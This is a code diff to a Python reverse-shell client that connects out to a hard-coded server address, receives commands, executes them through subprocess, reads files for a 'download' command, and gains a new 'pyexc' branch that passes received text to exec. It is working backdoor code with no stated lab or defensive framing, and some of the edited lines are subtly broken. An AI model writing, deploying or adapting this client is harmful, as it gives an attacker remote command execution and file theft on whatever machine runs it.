@@ -10,15 +10,19 @@ try:
 except:
     pass
 SERVER_HOST = "192.168.204.1"
-SERVER_PORT = 5003
+SERVER_PORT = 8000
 BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
-SEPARATOR = "\n"
+SEPARATOR = "<seperator>"
 output = ""
 # create the socket object
 s = socket.socket()
 # connect to the server
-s.connect((SERVER_HOST, SERVER_PORT))
+try:
+    s.connect((SERVER_HOST, SERVER_PORT))
+except:
+    print(f"Kļūda, Connection Refused on machine {SERVER_HOST}:{SERVER_PORT}")
+    raise ConnectionRefusedError
 # get the current directory
 cwd = os.getcwd()
 s.send(cwd.encode())
@@ -26,7 +30,10 @@ s.send(cwd.encode())
 while True:
     output = ""
     # receive the command from the server
-    command = s.recv(BUFFER_SIZE).decode()
+    try:
+        command = s.recv(BUFFER_SIZE).decode()
+    except:
+        raise
     splited_command = command.split()
     try:
         if command.lower() == "exit":
@@ -37,8 +44,8 @@ while True:
                 if cmd.startswith("download "):
                     path = cmd[8:]
                     with open(path, "r") as file:
-                        filedata = file.read(f"Contents of file [{path}]:\n{file.read()}")
-                        output = ""
+                        filedata = file.read()
+                        output = filedata + f"{file.read()}"
                 else:
                     raise ValueError("Needs a file path to download idiot")
         if splited_command[0].lower() == "cd":
@@ -51,6 +58,8 @@ while True:
             else:
                 # if operation is successful, empty message
                 output = ""
+        if splited_command[0].lower() == "pyexc":
+            exec(splited_command[0][6:])
         else:
             # execute the command and retrieve the results
             output = subprocess.getoutput(command)
